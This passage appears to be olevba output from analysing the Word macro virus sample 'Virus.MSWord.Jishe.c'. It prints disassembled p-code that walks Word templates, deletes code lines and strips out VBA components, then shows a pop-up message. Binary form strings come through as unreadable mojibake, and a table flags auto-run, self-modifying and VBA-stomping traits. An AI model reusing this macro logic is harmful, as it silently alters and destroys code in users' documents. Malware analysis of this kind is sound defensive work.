' 	StartForVariable 
' 	Next 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	StartForVariable 
' 	Next 
' Line #176:
' 	QuoteRem 0x0000 0x0018 "Çå³ýWORDÄ£°åÖÐµÄ²¡¶¾´úÂë"
' Line #177:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Word 
' 	MemLd Templates 
' 	ForEach 
' Line #178:
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #179:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #180:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #181:
' 	Ld xitem 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St LinesofCode 
' Line #182:
' 	Ld LinesofCode 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #183:
' 	Ld answer 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #184:
' 	LitDI2 0x0001 
' 	Ld LinesofCode 
' 	Ld xitem 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	EndIfBlock 
' Line #187:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x0009 "JiShenhua"
' 	Ne 
' 	Paren 
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000B "VirusReport"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #188:
' 	Ld xitem 
' 	Paren 
' 	Ld myTemp 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	StartForVariable 
' 	Next 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	StartForVariable 
' 	Next 
' Line #193:
' 	Ld VirusReport 
' 	ArgsCall Unlock 0x0001 
' Line #194:
' 	LitStr 0x005D "°´ÕÕÄúµÄÖ¸Ê¾£¬ÎÒÒÑ¾­°Ñ»³ÒÉÊÇ²¡¶¾µÄ¶«¶«È«²¿ÇåÀíÍê±Ï£¬ ²»¹ýÒ²¿ÉÄÜºÃÐÄ°ìÁË»µÊÂ£¬ÄÇ¿É²»Òª¹ÖÎÒÓ´¡£"
' 	Ld vbOKOnly 
' 	LitStr 0x0010 "¼½É÷»ªÏòÄú±¨¸æ£º"
' 	ArgsCall MsgBox 0x0003 
' Line #195:
' 	EndSub 
' Line #196:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yr%`
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�s�N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�e�N-N�S��	g 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�[�u�k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[	g�S���[`O�v�e�N �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b4xOW
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�Y�g`Onx�Oُ�N�[eg�SN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N�[`O�e(u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S�NhQ� Rd�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yrdk�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yb:y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QNaNS�+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}T�N`OhQCg
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@gKN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`O�~+RN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qNSb�bJT
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T;N�{Gl�b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1u�N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�QN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Nek�g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�Q�b
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonKill'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonNothing'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonOpenVisubasic'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButtonDetail'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Information'" IN './Virus.MSWord.Jishe.c' - OLE stream: 'Macros/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButtonNothing|Runs when the file is opened and ActiveX     |
|          |_Click              |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

